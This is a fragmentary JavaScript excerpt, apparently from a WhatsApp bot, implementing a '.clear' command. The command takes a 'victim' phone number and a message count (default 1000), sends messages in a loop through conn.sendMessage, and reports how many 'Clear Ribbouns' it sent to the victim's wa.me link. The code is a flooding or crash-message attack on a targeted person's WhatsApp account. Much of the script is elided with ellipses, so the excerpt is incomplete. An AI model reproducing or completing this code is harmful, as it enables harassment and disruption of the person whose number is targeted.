...
if (!victim) throw `! Enter Victim number and count correctly [ ex :- .clear 94778115292/2000 ] (Default count is 1000)`
...
while (i2 < count * 2 ) {
   ...
   await conn.sendMessage(group10, { text : `${textx}` })
    ...
    await conn.sendMessage(m.chat, { text : `Succesfully sent ${count * 2} Clear Ribbouns to number wa.me/${victim}` } , { quoted: m } )
